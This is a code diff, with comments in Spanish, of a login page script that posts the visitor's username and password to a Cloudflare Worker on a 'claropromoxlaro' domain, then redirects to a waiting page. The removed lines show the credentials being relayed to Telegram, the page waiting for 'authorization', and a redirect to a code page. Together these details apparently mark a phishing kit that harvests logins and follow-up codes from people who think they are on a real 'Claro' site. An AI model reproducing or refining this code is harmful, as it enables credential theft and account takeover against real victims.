@@ -16,58 +16,30 @@
     <button type="submit">Enviar</button>
   </form>
 
-  <div id="espera" style="display:none;">
-    <h2>Ingresando...</h2>
-    <p id="status">Esperando autorización...</p>
-  </div>
-
   <script>
-    const loginForm = document.getElementById("loginForm");
-    const esperaDiv = document.getElementById("espera");
-    const statusEl = document.getElementById("status");
-
-    loginForm.addEventListener("submit", async (e) => {
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
 
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      try {
-        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ usuario, clave })
-        });
+      // URL de tu Worker
+      const url = "https://blue-night-7897.claropromoxlaro.workers.dev";
 
-        const data = await res.json();
-        if(data.ok){
-          alert("✅ Enviado a Telegram, esperando autorización...");
-          loginForm.style.display = "none";
-          esperaDiv.style.display = "block";
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario, clave })
+      });
 
-          const userId = data.id;
-
-          // Polling cada 3 segundos para verificar autorización
-          const interval = setInterval(async () => {
-            try {
-              const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${userId}`);
-              const statusData = await statusRes.json();
-              if(statusData.autorizado){
-                clearInterval(interval);
-                window.location.href = "codigo.html"; // Redirige al código
-              }
-            } catch(err){
-              console.error(err);
-              statusEl.textContent = "Error al conectar al servidor.";
-            }
-          }, 3000);
-
-        } else {
-          alert("❌ Error: " + data.error);
-        }
-
-      } catch(err){
-        alert("❌ Error al enviar datos: " + err.message);
+      const data = await res.json();
+      if(data.ok) {
+        // Guardamos el id temporal
+        localStorage.setItem("authId", data.id);
+        // Redirigimos a página de espera
+        window.location.href = "esperando.html";
+      } else {
+        alert("❌ Error al enviar: " + data.error);
       }
     });
   </script>
